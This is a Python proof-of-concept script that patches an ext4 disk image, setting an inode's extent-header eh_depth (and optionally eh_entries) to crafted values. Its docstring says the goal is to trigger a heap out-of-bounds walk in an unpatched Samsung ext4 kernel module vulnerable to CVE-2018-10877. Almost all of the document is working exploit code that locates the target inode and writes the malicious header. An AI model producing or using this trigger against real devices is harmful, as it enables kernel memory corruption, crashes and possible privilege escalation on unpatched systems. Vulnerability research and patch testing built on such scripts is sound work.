#!/usr/bin/env python3
"""Craft an ext4 image whose extent-tree root header carries a bogus eh_depth.

Target defect: ext4_find_extent() in the shipped 2019 ext4.ko reads eh_depth
into a *signed short* and never validates it (upstream fix bc890a602471,
CVE-2018-10877, is absent; Samsung's own 2020 tree has it).  eh_depth = 0xffff
=> depth = -1 => kzalloc(sizeof(path) * (depth+2)) = ONE 32-byte entry, while
path[0].p_depth is set to 0xffff, so the mandatory ext4_ext_drop_refs() on the
error path walks 65536 * 32 bytes past the allocation.

usage: mk-extdepth.py IMG.img INODE DEPTH
  INODE  inode number to patch (2 = root directory)
  DEPTH  raw little-endian value to store in eh_depth (e.g. 0xffff)
  ENTRIES optional new eh_entries (0 short-circuits ext4_valid_extent_entries)
"""
import struct
import sys


def rd(f, off, n):
    f.seek(off)
    return f.read(n)


def main():
    img, ino, depth = sys.argv[1], int(sys.argv[2]), int(sys.argv[3], 0)
    new_entries = int(sys.argv[4], 0) if len(sys.argv) > 4 else None
    with open(img, "r+b") as f:
        sb = rd(f, 1024, 1024)
        log_bs = struct.unpack_from("<I", sb, 0x18)[0]
        bs = 1024 << log_bs
        first_data_block = struct.unpack_from("<I", sb, 0x14)[0]
        ipg = struct.unpack_from("<I", sb, 0x28)[0]
        isize = struct.unpack_from("<H", sb, 0x58)[0]
        feat_incompat = struct.unpack_from("<I", sb, 0x60)[0]
        desc_size = struct.unpack_from("<H", sb, 0xFE)[0]
        if not (feat_incompat & 0x80):  # INCOMPAT_64BIT
            desc_size = 32
        desc_size = max(desc_size, 32)

        group = (ino - 1) // ipg
        index = (ino - 1) % ipg
        gd_off = (first_data_block + 1) * bs + group * desc_size
        gd = rd(f, gd_off, desc_size)
        itable = struct.unpack_from("<I", gd, 8)[0]
        if desc_size >= 64:
            itable |= struct.unpack_from("<I", gd, 0x28)[0] << 32
        ino_off = itable * bs + index * isize

        raw = bytearray(rd(f, ino_off, isize))
        i_flags = struct.unpack_from("<I", raw, 0x20)[0]
        hdr = raw[0x28:0x28 + 12]
        magic, entries, emax, edepth = struct.unpack_from("<HHHH", hdr, 0)
        print(f"blocksize={bs} inode_size={isize} itable_blk={itable} "
              f"inode{ino}@0x{ino_off:x}")
        print(f"  i_flags=0x{i_flags:x} extents={'yes' if i_flags & 0x80000 else 'NO'}")
        print(f"  eh_magic=0x{magic:04x} eh_entries={entries} eh_max={emax} "
              f"eh_depth={edepth}")
        if magic != 0xF30A:
            sys.exit("inode is not extent-mapped (bad eh_magic)")
        struct.pack_into("<H", raw, 0x28 + 6, depth & 0xFFFF)
        if new_entries is not None:
            struct.pack_into("<H", raw, 0x28 + 2, new_entries & 0xFFFF)
            print(f"  -> eh_entries patched to {new_entries}")
        f.seek(ino_off)
        f.write(raw)
        print(f"  -> eh_depth patched to 0x{depth & 0xFFFF:04x}")


main()
